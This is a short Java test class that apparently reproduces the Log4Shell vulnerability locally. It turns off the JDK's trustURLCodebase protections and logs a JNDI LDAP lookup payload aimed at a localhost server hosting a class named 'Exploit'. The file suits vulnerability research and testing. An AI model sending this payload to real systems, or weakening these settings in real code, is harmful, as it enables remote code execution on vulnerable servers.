import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


class LogTest{
    public LogTest(){}
    public static final Logger logger = LogManager.getLogger(LogTest.class);
    public static void main(String[] args){
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://127.0.0.1:8888/Exploit}");
    }
}